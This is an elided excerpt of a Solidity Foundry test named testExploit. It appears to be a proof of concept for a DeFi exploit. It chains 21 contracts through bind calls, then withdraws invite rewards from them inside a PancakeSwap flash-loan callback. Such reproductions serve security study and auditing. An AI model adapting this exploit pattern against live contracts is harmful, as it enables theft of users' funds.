...
contract ContractTest is Test {
    ...
    function testExploit() public {
        ...
        for (uint256 i = 1; i < 22; i++) {
            (bool success1,) = contractList[i].call(abi.encodeWithSignature("bind(address)", contractList[i - 1]));
            require(success1);
        }
    ...
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        ...
        (bool success4,) = contractList[0].call(abi.encodeWithSignature("withdraw(address)", address(this))); // claim the reward from _addInviteReward()
        (bool success5,) = contractList[1].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        (bool success6,) = contractList[2].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        (bool sucess8,) = contractList[3].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        (bool sucess10,) = contractList[4].call(abi.encodeWithSignature("withdraw(address)", address(this)));
